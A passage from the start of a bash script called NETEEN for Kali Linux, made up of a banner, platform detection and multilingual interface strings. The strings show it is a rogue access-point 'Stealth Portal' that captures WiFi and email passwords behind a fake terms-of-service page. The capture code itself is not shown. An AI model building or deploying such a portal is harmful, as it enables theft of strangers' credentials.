#!/bin/bash
# NETEEN - Network Assessment Tool
# Author: apspydon
# UPDATED VERSION: Multi-language, Kali Linux focused

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Configuration
CONFIG_FILE="/tmp/neteen.conf"
LANG_FILE="/tmp/neteen_lang.conf"

# Global variables
WIFI_IFACE=""
CLEANUP_DONE="false"
PLATFORM="KaliLinux"
CURRENT_LANG="en"
MONITOR_PID=""
WAITER_PID=""

# Language strings declaration
declare -A LANG_STRINGS

# Header
show_header() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
╔═════════════════════════════════════════════════════════════════════╗
║                                                                     ║
║    ███╗   ██╗███████╗████████╗███████╗███████╗███████╗███╗   ██╗    ║
║    ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔════╝████╗  ██║    ║
║    ██╔██╗ ██║█████╗     ██║   █████╗  █████╗  █████╗  ██╔██╗ ██║    ║
║    ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║    ║
║    ██║ ╚████║███████╗   ██║   ███████╗███████╗███████╗██║ ╚████║    ║
║    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝    ║
║                                                                     ║
║                         N E T E E N                                 ║
║                       by apspydon                                   ║
║                                                                     ║
╚═════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Platform detection - Simplified for Kali Linux only
detect_platform() {
    if [[ -f "/etc/os-release" ]] && grep -q "Kali" /etc/os-release; then
        PLATFORM="KaliLinux"
        echo -e "${GREEN}$(get_str 99) $PLATFORM${NC}"
    else
        echo -e "${RED}This script requires Kali Linux. Some features may not work on other systems.${NC}"
        PLATFORM="Unknown"
    fi
    sleep 1
}

# Language initialization
init_languages() {
    # English (default)
    LANG_STRINGS["en",1]="Stealth Portal"
    LANG_STRINGS["en",2]="Network Scanner" 
    LANG_STRINGS["en",3]="Exit"
    LANG_STRINGS["en",4]="Select platform:"
    LANG_STRINGS["en",5]="macOS"
    LANG_STRINGS["en",6]="Kali Linux"
    LANG_STRINGS["en",7]="Select language:"
    LANG_STRINGS["en",8]="English"
    LANG_STRINGS["en",9]="Spanish"
    LANG_STRINGS["en",10]="French"
    LANG_STRINGS["en",11]="German"
    LANG_STRINGS["en",12]="Italian"
    LANG_STRINGS["en",13]="Portuguese"
    LANG_STRINGS["en",14]="Russian"
    LANG_STRINGS["en",15]="Chinese"
    LANG_STRINGS["en",16]="Japanese"
    LANG_STRINGS["en",17]="Arabic"
    LANG_STRINGS["en",18]="Available Interfaces"
    LANG_STRINGS["en",19]="No wireless interfaces found or available"
    LANG_STRINGS["en",20]="Select interface"
    LANG_STRINGS["en",21]="Selected:"
    LANG_STRINGS["en",22]="Invalid selection"
    LANG_STRINGS["en",23]="Checking dependencies..."
    LANG_STRINGS["en",24]="Missing packages:"
    LANG_STRINGS["en",25]="Installing dependencies..."
    LANG_STRINGS["en",26]="All dependencies installed"
    LANG_STRINGS["en",27]="Please run as root: sudo ./NETEEN.sh"
    LANG_STRINGS["en",28]="Starting Stealth Portal..."
    LANG_STRINGS["en",29]="Starting Network Scanner..."
    LANG_STRINGS["en",30]="Scanning networks..."
    LANG_STRINGS["en",31]="No wireless interface found"
    LANG_STRINGS["en",32]="Press Enter to continue..."
    LANG_STRINGS["en",33]="SSID name:"
    LANG_STRINGS["en",34]="Portal Configuration"
    LANG_STRINGS["en",35]="Select Portal Type"
    LANG_STRINGS["en",36]="Default Portal"
    LANG_STRINGS["en",37]="Custom Portal"
    LANG_STRINGS["en",38]="Select type"
    LANG_STRINGS["en",39]="Using default portal"
    LANG_STRINGS["en",40]="Select Theme"
    LANG_STRINGS["en",41]="Blue"
    LANG_STRINGS["en",42]="Dark"
    LANG_STRINGS["en",43]="Green"
    LANG_STRINGS["en",44]="Red"
    LANG_STRINGS["en",45]="Purple"
    LANG_STRINGS["en",46]="Theme:"
    LANG_STRINGS["en",47]="Portal Title"
    LANG_STRINGS["en",48]="Welcome Message"
    LANG_STRINGS["en",49]="WiFi Password Label"
    LANG_STRINGS["en",50]="Email Label"
    LANG_STRINGS["en",51]="Email Password Label"
    LANG_STRINGS["en",52]="Button Text"
    LANG_STRINGS["en",53]="Success Message"
    LANG_STRINGS["en",54]="Setting up interface..."
    LANG_STRINGS["en",55]="Interface ready"
    LANG_STRINGS["en",56]="Starting access point..."
    LANG_STRINGS["en",57]="AP started"
    LANG_STRINGS["en",58]="Failed to start AP"
    LANG_STRINGS["en",59]="Starting DHCP..."
    LANG_STRINGS["en",60]="DHCP ready"
    LANG_STRINGS["en",61]="Setting up portal..."
    LANG_STRINGS["en",62]="Portal ready"
    LANG_STRINGS["en",63]="Cleaning up..."
    LANG_STRINGS["en",64]="Cleanup done"
    LANG_STRINGS["en",65]="PORTAL ACTIVE"
    LANG_STRINGS["en",66]="Interface"
    LANG_STRINGS["en",67]="Clients"
    LANG_STRINGS["en",68]="Status: Waiting for connections"
    LANG_STRINGS["en",69]="Press Ctrl+C to stop"
    LANG_STRINGS["en",70]="CREDENTIALS CAPTURED"
    LANG_STRINGS["en",71]="Time"
    LANG_STRINGS["en",72]="IP"
    LANG_STRINGS["en",73]="Device"
    LANG_STRINGS["en",74]="WiFi Password"
    LANG_STRINGS["en",75]="Email"
    LANG_STRINGS["en",76]="Password"
    LANG_STRINGS["en",77]="Network"
    LANG_STRINGS["en",78]="Channel"
    LANG_STRINGS["en",79]="Signal"
    LANG_STRINGS["en",80]="Thanks for using NETEEN, goodbye!"
    LANG_STRINGS["en",81]="MAIN MENU"
    LANG_STRINGS["en",82]="Goodbye!"
    LANG_STRINGS["en",83]="Select option"
    LANG_STRINGS["en",84]="Starting Portal"
    LANG_STRINGS["en",85]="NETWORK SCAN RESULTS"
    LANG_STRINGS["en",86]="Credential monitoring active..."
    LANG_STRINGS["en",87]="Note: Stealth Portal on macOS has limited functionality"
    LANG_STRINGS["en",88]="Some features may not work as expected"
    LANG_STRINGS["en",89]="Note: macOS interface setup may require additional configuration"
    LANG_STRINGS["en",90]="Full functionality requires Kali Linux"
    LANG_STRINGS["en",91]="For macOS, please ensure wireless tools are available"
    LANG_STRINGS["en",92]="You may need to install additional tools manually"
    LANG_STRINGS["en",93]="Airport utility not found. Using alternative scan method..."
    LANG_STRINGS["en",94]="Note: Routing setup on macOS may require additional configuration"
    LANG_STRINGS["en",95]="Select platform"
    LANG_STRINGS["en",96]="Select language"
    LANG_STRINGS["en",97]="Language set to:"
    LANG_STRINGS["en",98]="Platform set to:"
    LANG_STRINGS["en",99]="Detected platform:"
    LANG_STRINGS["en",100]="By connecting, you agree to our terms of service"
    LANG_STRINGS["en",101]="Change Language"

    # Spanish
    LANG_STRINGS["es",1]="Portal Sigiloso"
    LANG_STRINGS["es",2]="Escáner de Red"
    LANG_STRINGS["es",3]="Salir"
    LANG_STRINGS["es",4]="Seleccionar plataforma:"
    LANG_STRINGS["es",5]="macOS"
    LANG_STRINGS["es",6]="Kali Linux"
    LANG_STRINGS["es",7]="Seleccionar idioma:"
    LANG_STRINGS["es",8]="Inglés"
    LANG_STRINGS["es",9]="Español"
    LANG_STRINGS["es",10]="Francés"
    LANG_STRINGS["es",11]="Alemán"
    LANG_STRINGS["es",12]="Italiano"
    LANG_STRINGS["es",13]="Portugués"
    LANG_STRINGS["es",14]="Ruso"
    LANG_STRINGS["es",15]="Chino"
    LANG_STRINGS["es",16]="Japonés"
    LANG_STRINGS["es",17]="Árabe"
    LANG_STRINGS["es",18]="Interfaces Disponibles"
    LANG_STRINGS["es",19]="No se encontraron interfaces wireless disponibles"
    LANG_STRINGS["es",20]="Seleccionar interfaz"
    LANG_STRINGS["es",21]="Seleccionado:"
    LANG_STRINGS["es",22]="Selección inválida"
    LANG_STRINGS["es",23]="Verificando dependencias..."
    LANG_STRINGS["es",24]="Paquetes faltantes:"
    LANG_STRINGS["es",25]="Instalando dependencias..."
    LANG_STRINGS["es",26]="Todas las dependencias instaladas"
    LANG_STRINGS["es",27]="Por favor ejecutar como root: sudo ./NETEEN.sh"
    LANG_STRINGS["es",28]="Iniciando Portal Sigiloso..."
    LANG_STRINGS["es",29]="Iniciando Escáner de Red..."
    LANG_STRINGS["es",30]="Escaneando redes..."
    LANG_STRINGS["es",31]="No se encontró interfaz wireless"
    LANG_STRINGS["es",32]="Presione Enter para continuar..."
    LANG_STRINGS["es",33]="Nombre SSID:"
    LANG_STRINGS["es",34]="Configuración del Portal"
    LANG_STRINGS["es",35]="Seleccionar Tipo de Portal"
    LANG_STRINGS["es",36]="Portal Predeterminado"
    LANG_STRINGS["es",37]="Portal Personalizado"
    LANG_STRINGS["es",38]="Seleccionar tipo"
    LANG_STRINGS["es",39]="Usando portal predeterminado"
    LANG_STRINGS["es",40]="Seleccionar Tema"
    LANG_STRINGS["es",41]="Azul"
    LANG_STRINGS["es",42]="Oscuro"
    LANG_STRINGS["es",43]="Verde"
    LANG_STRINGS["es",44]="Rojo"
    LANG_STRINGS["es",45]="Púrpura"
    LANG_STRINGS["es",46]="Tema:"
    LANG_STRINGS["es",47]="Título del Portal"
    LANG_STRINGS["es",48]="Mensaje de Bienvenida"
    LANG_STRINGS["es",49]="Etiqueta de Contraseña WiFi"
    LANG_STRINGS["es",50]="Etiqueta de Email"
    LANG_STRINGS["es",51]="Etiqueta de Contraseña de Email"
    LANG_STRINGS["es",52]="Texto del Botón"
    LANG_STRINGS["es",53]="Mensaje de Éxito"
    LANG_STRINGS["es",54]="Configurando interfaz..."
    LANG_STRINGS["es",55]="Interfaz lista"
    LANG_STRINGS["es",56]="Iniciando punto de acceso..."
    LANG_STRINGS["es",57]="AP iniciado"
    LANG_STRINGS["es",58]="Error al iniciar AP"
    LANG_STRINGS["es",59]="Iniciando DHCP..."
    LANG_STRINGS["es",60]="DHCP listo"
    LANG_STRINGS["es",61]="Configurando portal..."
    LANG_STRINGS["es",62]="Portal listo"
    LANG_STRINGS["es",63]="Limpiando..."
    LANG_STRINGS["es",64]="Limpieza completada"
    LANG_STRINGS["es",65]="PORTAL ACTIVO"
    LANG_STRINGS["es",66]="Interfaz"
    LANG_STRINGS["es",67]="Clientes"
    LANG_STRINGS["es",68]="Estado: Esperando conexiones"
    LANG_STRINGS["es",69]="Presione Ctrl+C para detener"
    LANG_STRINGS["es",70]="CREDENCIALES CAPTURADAS"
    LANG_STRINGS["es",71]="Tiempo"
    LANG_STRINGS["es",72]="IP"
    LANG_STRINGS["es",73]="Dispositivo"
    LANG_STRINGS["es",74]="Contraseña WiFi"
    LANG_STRINGS["es",75]="Email"
    LANG_STRINGS["es",76]="Contraseña"
    LANG_STRINGS["es",77]="Red"
    LANG_STRINGS["es",78]="Canal"
    LANG_STRINGS["es",79]="Señal"
    LANG_STRINGS["es",80]="¡Gracias por usar NETEEN, hasta luego!"
    LANG_STRINGS["es",81]="MENÚ PRINCIPAL"
    LANG_STRINGS["es",82]="¡Adiós!"
    LANG_STRINGS["es",83]="Seleccionar opción"
    LANG_STRINGS["es",84]="Iniciando Portal"
    LANG_STRINGS["es",85]="RESULTADOS DEL ESCANEO DE RED"
    LANG_STRINGS["es",86]="Monitoreo de credenciales activo..."
    LANG_STRINGS["es",87]="Nota: Portal Sigiloso en macOS tiene funcionalidad limitada"
    LANG_STRINGS["es",88]="Algunas funciones pueden no funcionar como se espera"
    LANG_STRINGS["es",89]="Nota: La configuración de interfaz en macOS puede requerir configuración adicional"
    LANG_STRINGS["es",90]="La funcionalidad completa requiere Kali Linux"
    LANG_STRINGS["es",91]="Para macOS, asegúrese de que las herramientas wireless estén disponibles"
    LANG_STRINGS["es",92]="Es posible que necesite instalar herramientas adicionales manualmente"
    LANG_STRINGS["es",93]="Utilidad airport no encontrada. Usando método de escaneo alternativo..."
    LANG_STRINGS["es",94]="Nota: La configuración de enrutamiento en macOS puede requerir configuración adicional"
    LANG_STRINGS["es",95]="Seleccionar plataforma"
    LANG_STRINGS["es",96]="Seleccionar idioma"
    LANG_STRINGS["es",97]="Idioma establecido:"
    LANG_STRINGS["es",98]="Plataforma establecida:"
    LANG_STRINGS["es",99]="Plataforma detectada:"
    LANG_STRINGS["es",100]="Al conectarse, acepta nuestros términos de servicio"
    LANG_STRINGS["es",101]="Cambiar Idioma"

    # French
    LANG_STRINGS["fr",1]="Portail Furtif"
    LANG_STRINGS["fr",2]="Scanner Réseau"
    LANG_STRINGS["fr",3]="Quitter"
    LANG_STRINGS["fr",4]="Sélectionner la plateforme:"
    LANG_STRINGS["fr",5]="macOS"
    LANG_STRINGS["fr",6]="Kali Linux"
    LANG_STRINGS["fr",7]="Sélectionner la langue:"
    LANG_STRINGS["fr",8]="Anglais"
    LANG_STRINGS["fr",9]="Espagnol"
    LANG_STRINGS["fr",10]="Français"
    LANG_STRINGS["fr",11]="Allemand"
    LANG_STRINGS["fr",12]="Italien"
    LANG_STRINGS["fr",13]="Portugais"
    LANG_STRINGS["fr",14]="Russe"
    LANG_STRINGS["fr",15]="Chinois"
    LANG_STRINGS["fr",16]="Japonais"
    LANG_STRINGS["fr",17]="Arabe"
    LANG_STRINGS["fr",18]="Interfaces Disponibles"
    LANG_STRINGS["fr",19]="Aucune interface sans fil trouvée ou disponible"
    LANG_STRINGS["fr",20]="Sélectionner l'interface"
    LANG_STRINGS["fr",21]="Sélectionné:"
    LANG_STRINGS["fr",22]="Sélection invalide"
    LANG_STRINGS["fr",23]="Vérification des dépendances..."
    LANG_STRINGS["fr",24]="Paquets manquants:"
    LANG_STRINGS["fr",25]="Installation des dépendances..."
    LANG_STRINGS["fr",26]="Toutes les dépendances sont installées"
    LANG_STRINGS["fr",27]="Veuillez exécuter en tant que root: sudo ./NETEEN.sh"
    LANG_STRINGS["fr",28]="Démarrage du Portail Furtif..."
    LANG_STRINGS["fr",29]="Démarrage du Scanner Réseau..."
    LANG_STRINGS["fr",30]="Scan des réseaux..."
    LANG_STRINGS["fr",31]="Aucune interface sans fil trouvée"
    LANG_STRINGS["fr",32]="Appuyez sur Entrée pour continuer..."
    LANG_STRINGS["fr",33]="Nom SSID:"
    LANG_STRINGS["fr",34]="Configuration du Portail"
    LANG_STRINGS["fr",35]="Sélectionner le Type de Portail"
    LANG_STRINGS["fr",36]="Portail par Défaut"
    LANG_STRINGS["fr",37]="Portail Personnalisé"
    LANG_STRINGS["fr",38]="Sélectionner le type"
    LANG_STRINGS["fr",39]="Utilisation du portail par défaut"
    LANG_STRINGS["fr",40]="Sélectionner le Thème"
    LANG_STRINGS["fr",41]="Bleu"
    LANG_STRINGS["fr",42]="Sombre"
    LANG_STRINGS["fr",43]="Vert"
    LANG_STRINGS["fr",44]="Rouge"
    LANG_STRINGS["fr",45]="Violet"
    LANG_STRINGS["fr",46]="Thème:"
    LANG_STRINGS["fr",47]="Titre du Portail"
    LANG_STRINGS["fr",48]="Message de Bienvenue"
    LANG_STRINGS["fr",49]="Étiquette du Mot de Passe WiFi"
    LANG_STRINGS["fr",50]="Étiquette Email"
    LANG_STRINGS["fr",51]="Étiquette du Mot de Passe Email"
    LANG_STRINGS["fr",52]="Texte du Bouton"
    LANG_STRINGS["fr",53]="Message de Succès"
    LANG_STRINGS["fr",54]="Configuration de l'interface..."
    LANG_STRINGS["fr",55]="Interface prête"
    LANG_STRINGS["fr",56]="Démarrage du point d'accès..."
    LANG_STRINGS["fr",57]="AP démarré"
    LANG_STRINGS["fr",58]="Échec du démarrage de l'AP"
    LANG_STRINGS["fr",59]="Démarrage du DHCP..."
    LANG_STRINGS["fr",60]="DHCP prêt"
    LANG_STRINGS["fr",61]="Configuration du portail..."
    LANG_STRINGS["fr",62]="Portail prêt"
    LANG_STRINGS["fr",63]="Nettoyage..."
    LANG_STRINGS["fr",64]="Nettoyage terminé"
    LANG_STRINGS["fr",65]="PORTAL ACTIF"
    LANG_STRINGS["fr",66]="Interface"
    LANG_STRINGS["fr",67]="Clients"
    LANG_STRINGS["fr",68]="Statut: En attente de connexions"
    LANG_STRINGS["fr",69]="Appuyez sur Ctrl+C pour arrêter"
    LANG_STRINGS["fr",70]="IDENTIFIANTS CAPTURÉS"
    LANG_STRINGS["fr",71]="Heure"
    LANG_STRINGS["fr",72]="IP"
    LANG_STRINGS["fr",73]="Appareil"
    LANG_STRINGS["fr",74]="Mot de Passe WiFi"
    LANG_STRINGS["fr",75]="Email"
    LANG_STRINGS["fr",76]="Mot de Passe"
    LANG_STRINGS["fr",77]="Réseau"
    LANG_STRINGS["fr",78]="Canal"
    LANG_STRINGS["fr",79]="Signal"
    LANG_STRINGS["fr",80]="Merci d'avoir utilisé NETEEN, au revoir !"
    LANG_STRINGS["fr",81]="MENU PRINCIPAL"
    LANG_STRINGS["fr",82]="Au revoir !"
    LANG_STRINGS["fr",83]="Sélectionner une option"
    LANG_STRINGS["fr",84]="Démarrage du Portail"
    LANG_STRINGS["fr",85]="RÉSULTATS DU SCAN RÉSEAU"
    LANG_STRINGS["fr",86]="Surveillance des identifiants active..."
    LANG_STRINGS["fr",87]="Note : Le Portail Furtif sur macOS a une fonctionnalité limitée"
    LANG_STRINGS["fr",88]="Certaines fonctionnalités peuvent ne pas fonctionner comme prévu"
    LANG_STRINGS["fr",89]="Note : La configuration de l'interface sur macOS peut nécessiter une configuration supplémentaire"
    LANG_STRINGS["fr",90]="La fonctionnalité complète nécessite Kali Linux"
    LANG_STRINGS["fr",91]="Pour macOS, assurez-vous que les outils sans fil sont disponibles"
    LANG_STRINGS["fr",92]="Vous devrez peut-être installer des outils supplémentaires manuellement"
    LANG_STRINGS["fr",93]="Utilitaire airport non trouvé. Utilisation d'une méthode de scan alternative..."
    LANG_STRINGS["fr",94]="Note : La configuration du routage sur macOS peut nécessiter une configuration supplémentaire"
    LANG_STRINGS["fr",95]="Sélectionner la plateforme"
    LANG_STRINGS["fr",96]="Sélectionner la langue"
    LANG_STRINGS["fr",97]="Langue définie :"
    LANG_STRINGS["fr",98]="Plateforme définie :"
    LANG_STRINGS["fr",99]="Plateforme détectée :"
    LANG_STRINGS["fr",100]="En vous connectant, vous acceptez nos conditions d'utilisation"
    LANG_STRINGS["fr",101]="Changer de Langue"

    # German
    LANG_STRINGS["de",1]="Stealth Portal"
    LANG_STRINGS["de",2]="Netzwerk Scanner"
    LANG_STRINGS["de",3]="Beenden"
    LANG_STRINGS["de",4]="Plattform auswählen:"
    LANG_STRINGS["de",5]="macOS"
    LANG_STRINGS["de",6]="Kali Linux"
    LANG_STRINGS["de",7]="Sprache auswählen:"
    LANG_STRINGS["de",8]="Englisch"
    LANG_STRINGS["de",9]="Spanisch"
    LANG_STRINGS["de",10]="Französisch"
    LANG_STRINGS["de",11]="Deutsch"
    LANG_STRINGS["de",12]="Italienisch"
    LANG_STRINGS["de",13]="Portugiesisch"
    LANG_STRINGS["de",14]="Russisch"
    LANG_STRINGS["de",15]="Chinesisch"
    LANG_STRINGS["de",16]="Japanisch"
    LANG_STRINGS["de",17]="Arabisch"
    LANG_STRINGS["de",18]="Verfügbare Schnittstellen"
    LANG_STRINGS["de",19]="Keine WLAN-Schnittstellen gefunden oder verfügbar"
    LANG_STRINGS["de",20]="Schnittstelle auswählen"
    LANG_STRINGS["de",21]="Ausgewählt:"
    LANG_STRINGS["de",22]="Ungültige Auswahl"
    LANG_STRINGS["de",23]="Überprüfe Abhängigkeiten..."
    LANG_STRINGS["de",24]="Fehlende Pakete:"
    LANG_STRINGS["de",25]="Installiere Abhängigkeiten..."
    LANG_STRINGS["de",26]="Alle Abhängigkeiten installiert"
    LANG_STRINGS["de",27]="Bitte als Root ausführen: sudo ./NETEEN.sh"
    LANG_STRINGS["de",28]="Starte Stealth Portal..."
    LANG_STRINGS["de",29]="Starte Netzwerk Scanner..."
    LANG_STRINGS["de",30]="Scanne Netzwerke..."
    LANG_STRINGS["de",31]="Keine WLAN-Schnittstelle gefunden"
    LANG_STRINGS["de",32]="Drücken Sie Enter um fortzufahren..."
    LANG_STRINGS["de",33]="SSID Name:"
    LANG_STRINGS["de",34]="Portal Konfiguration"
    LANG_STRINGS["de",35]="Portal Typ auswählen"
    LANG_STRINGS["de",36]="Standard Portal"
    LANG_STRINGS["de",37]="Benutzerdefiniertes Portal"
    LANG_STRINGS["de",38]="Typ auswählen"
    LANG_STRINGS["de",39]="Verwende Standard-Portal"
    LANG_STRINGS["de",40]="Thema auswählen"
    LANG_STRINGS["de",41]="Blau"
    LANG_STRINGS["de",42]="Dunkel"
    LANG_STRINGS["de",43]="Grün"
    LANG_STRINGS["de",44]="Rot"
    LANG_STRINGS["de",45]="Lila"
    LANG_STRINGS["de",46]="Thema:"
    LANG_STRINGS["de",47]="Portal Titel"
    LANG_STRINGS["de",48]="Willkommensnachricht"
    LANG_STRINGS["de",49]="WLAN-Passwort Beschriftung"
    LANG_STRINGS["de",50]="E-Mail Beschriftung"
    LANG_STRINGS["de",51]="E-Mail Passwort Beschriftung"
    LANG_STRINGS["de",52]="Button Text"
    LANG_STRINGS["de",53]="Erfolgsmeldung"
    LANG_STRINGS["de",54]="Richte Schnittstelle ein..."
    LANG_STRINGS["de",55]="Schnittstelle bereit"
    LANG_STRINGS["de",56]="Starte Zugangspunkt..."
    LANG_STRINGS["de",57]="AP gestartet"
    LANG_STRINGS["de",58]="Fehler beim Starten des AP"
    LANG_STRINGS["de",59]="Starte DHCP..."
    LANG_STRINGS["de",60]="DHCP bereit"
    LANG_STRINGS["de",61]="Richte Portal ein..."
    LANG_STRINGS["de",62]="Portal bereit"
    LANG_STRINGS["de",63]="Räume auf..."
    LANG_STRINGS["de",64]="Aufräumen abgeschlossen"
    LANG_STRINGS["de",65]="PORTAL AKTIV"
    LANG_STRINGS["de",66]="Schnittstelle"
    LANG_STRINGS["de",67]="Clients"
    LANG_STRINGS["de",68]="Status: Warte auf Verbindungen"
    LANG_STRINGS["de",69]="Drücken Sie Strg+C zum Beenden"
    LANG_STRINGS["de",70]="ZUGANGSDATEN ERFASST"
    LANG_STRINGS["de",71]="Zeit"
    LANG_STRINGS["de",72]="IP"
    LANG_STRINGS["de",73]="Gerät"
    LANG_STRINGS["de",74]="WLAN-Passwort"
    LANG_STRINGS["de",75]="E-Mail"
    LANG_STRINGS["de",76]="Passwort"
    LANG_STRINGS["de",77]="Netzwerk"
    LANG_STRINGS["de",78]="Kanal"
    LANG_STRINGS["de",79]="Signal"
    LANG_STRINGS["de",80]="Danke für die Verwendung von NETEEN, auf Wiedersehen!"
    LANG_STRINGS["de",81]="HAUPTMENÜ"
    LANG_STRINGS["de",82]="Auf Wiedersehen!"
    LANG_STRINGS["de",83]="Option auswählen"
    LANG_STRINGS["de",84]="Starte Portal"
    LANG_STRINGS["de",85]="NETZWERK SCAN ERGEBNISSE"
    LANG_STRINGS["de",86]="Überwachung der Zugangsdaten aktiv..."
    LANG_STRINGS["de",87]="Hinweis: Stealth Portal auf macOS hat eingeschränkte Funktionalität"
    LANG_STRINGS["de",88]="Einige Funktionen könnten nicht wie erwartet funktionieren"
    LANG_STRINGS["de",89]="Hinweis: Die Schnittstellenkonfiguration unter macOS erfordert möglicherweise zusätzliche Konfiguration"
    LANG_STRINGS["de",90]="Volle Funktionalität erfordert Kali Linux"
    LANG_STRINGS["de",91]="Für macOS stellen Sie sicher, dass Wireless-Tools verfügbar sind"
    LANG_STRINGS["de",92]="Möglicherweise müssen Sie zusätzliche Tools manuell installieren"
    LANG_STRINGS["de",93]="Airport-Dienstprogramm nicht gefunden. Verwende alternative Scan-Methode..."
    LANG_STRINGS["de",94]="Hinweis: Das Routing-Setup unter macOS erfordert möglicherweise zusätzliche Konfiguration"
    LANG_STRINGS["de",95]="Plattform auswählen"
    LANG_STRINGS["de",96]="Sprache auswählen"
    LANG_STRINGS["de",97]="Sprache eingestellt:"
    LANG_STRINGS["de",98]="Plattform eingestellt:"
    LANG_STRINGS["de",99]="Erkannte Plattform:"
    LANG_STRINGS["de",100]="Durch die Verbindung stimmen Sie unseren Nutzungsbedingungen zu"
    LANG_STRINGS["de",101]="Sprache Ändern"

    # Italian
    LANG_STRINGS["it",1]="Portale Stealth"
    LANG_STRINGS["it",2]="Scanner di Rete"
    LANG_STRINGS["it",3]="Esci"
    LANG_STRINGS["it",4]="Seleziona piattaforma:"
    LANG_STRINGS["it",5]="macOS"
    LANG_STRINGS["it",6]="Kali Linux"
    LANG_STRINGS["it",7]="Seleziona lingua:"
    LANG_STRINGS["it",8]="Inglese"
    LANG_STRINGS["it",9]="Spagnolo"
    LANG_STRINGS["it",10]="Francese"
    LANG_STRINGS["it",11]="Italiano"
    LANG_STRINGS["it",12]="Tedesco"
    LANG_STRINGS["it",13]="Portoghese"
    LANG_STRINGS["it",14]="Russo"
    LANG_STRINGS["it",15]="Cinese"
    LANG_STRINGS["it",16]="Giapponese"
    LANG_STRINGS["it",17]="Arabo"
    LANG_STRINGS["it",18]="Interfacce Disponibili"
    LANG_STRINGS["it",19]="Nessuna interfaccia wireless trovata o disponibile"
    LANG_STRINGS["it",20]="Seleziona interfaccia"
    LANG_STRINGS["it",21]="Selezionato:"
    LANG_STRINGS["it",22]="Selezione non valida"
    LANG_STRINGS["it",23]="Controllo dipendenze..."
    LANG_STRINGS["it",24]="Pacchetti mancanti:"
    LANG_STRINGS["it",25]="Installazione dipendenze..."
    LANG_STRINGS["it",26]="Tutte le dipendenze installated"
    LANG_STRINGS["it",27]="Si prega di eseguire come root: sudo ./NETEEN.sh"
    LANG_STRINGS["it",28]="Avvio Portale Stealth..."
    LANG_STRINGS["it",29]="Avvio Scanner di Rete..."
    LANG_STRINGS["it",30]="Scansione reti..."
    LANG_STRINGS["it",31]="Nessuna interfaccia wireless trovata"
    LANG_STRINGS["it",32]="Premere Invio per continuare..."
    LANG_STRINGS["it",33]="Nome SSID:"
    LANG_STRINGS["it",34]="Configurazione Portale"
    LANG_STRINGS["it",35]="Seleziona Tipo Portale"
    LANG_STRINGS["it",36]="Portale Predefinito"
    LANG_STRINGS["it",37]="Portale Personalizzato"
    LANG_STRINGS["it",38]="Seleziona tipo"
    LANG_STRINGS["it",39]="Utilizzo portale predefinito"
    LANG_STRINGS["it",40]="Seleziona Tema"
    LANG_STRINGS["it",41]="Blu"
    LANG_STRINGS["it",42]="Scuro"
    LANG_STRINGS["it",43]="Verde"
    LANG_STRINGS["it",44]="Rosso"
    LANG_STRINGS["it",45]="Viola"
    LANG_STRINGS["it",46]="Tema:"
    LANG_STRINGS["it",47]="Titolo Portale"
    LANG_STRINGS["it",48]="Messaggio di Benvenuto"
    LANG_STRINGS["it",49]="Etichetta Password WiFi"
    LANG_STRINGS["it",50]="Etichetta Email"
    LANG_STRINGS["it",51]="Etichetta Password Email"
    LANG_STRINGS["it",52]="Testo Pulsante"
    LANG_STRINGS["it",53]="Messaggio di Successo"
    LANG_STRINGS["it",54]="Configurazione interfaccia..."
    LANG_STRINGS["it",55]="Interfaccia pronta"
    LANG_STRINGS["it",56]="Avvio punto di accesso..."
    LANG_STRINGS["it",57]="AP avviato"
    LANG_STRINGS["it",58]="Impossibile avviare AP"
    LANG_STRINGS["it",59]="Avvio DHCP..."
    LANG_STRINGS["it",60]="DHCP pronto"
    LANG_STRINGS["it",61]="Configurazione portale..."
    LANG_STRINGS["it",62]="Portale pronto"
    LANG_STRINGS["it",63]="Pulizia..."
    LANG_STRINGS["it",64]="Pulizia completata"
    LANG_STRINGS["it",65]="PORTALE ATTIVO"
    LANG_STRINGS["it",66]="Interfaccia"
    LANG_STRINGS["it",67]="Clienti"
    LANG_STRINGS["it",68]="Stato: In attesa di connessioni"
    LANG_STRINGS["it",69]="Premere Ctrl+C per fermare"
    LANG_STRINGS["it",70]="CREDENZIALI CATTURATE"
    LANG_STRINGS["it",71]="Ora"
    LANG_STRINGS["it",72]="IP"
    LANG_STRINGS["it",73]="Dispositivo"
    LANG_STRINGS["it",74]="Password WiFi"
    LANG_STRINGS["it",75]="Email"
    LANG_STRINGS["it",76]="Password"
    LANG_STRINGS["it",77]="Rete"
    LANG_STRINGS["it",78]="Canale"
    LANG_STRINGS["it",79]="Segnale"
    LANG_STRINGS["it",80]="Grazie per aver usato NETEEN, arrivederci!"
    LANG_STRINGS["it",81]="MENU PRINCIPALE"
    LANG_STRINGS["it",82]="Arrivederci!"
    LANG_STRINGS["it",83]="Seleziona opzione"
    LANG_STRINGS["it",84]="Avvio Portale"
    LANG_STRINGS["it",85]="RISULTATI SCAN RETE"
    LANG_STRINGS["it",86]="Monitoraggio credenziali attivo..."
    LANG_STRINGS["it",87]="Nota: Portale Stealth su macOS ha funzionalità limitata"
    LANG_STRINGS["it",88]="Alcune funzionalità potrebbero non funzionare come previsto"
    LANG_STRINGS["it",89]="Nota: La configurazione dell'interfaccia su macOS potrebbe richiedere configurazione aggiuntiva"
    LANG_STRINGS["it",90]="La funzionalità completa richiede Kali Linux"
    LANG_STRINGS["it",91]="Per macOS, assicurati che gli strumenti wireless siano disponibili"
    LANG_STRINGS["it",92]="Potrebbe essere necessario installare strumenti aggiuntivi manualmente"
    LANG_STRINGS["it",93]="Utilità airport non trovata. Utilizzo metodo di scansione alternativo..."
    LANG_STRINGS["it",94]="Nota: La configurazione del routing su macOS potrebbe richiedere configurazione aggiuntiva"
    LANG_STRINGS["it",95]="Seleziona piattaforma"
    LANG_STRINGS["it",96]="Seleziona lingua"
    LANG_STRINGS["it",97]="Lingua impostata:"
    LANG_STRINGS["it",98]="Piattaforma impostata:"
    LANG_STRINGS["it",99]="Piattaforma rilevata:"
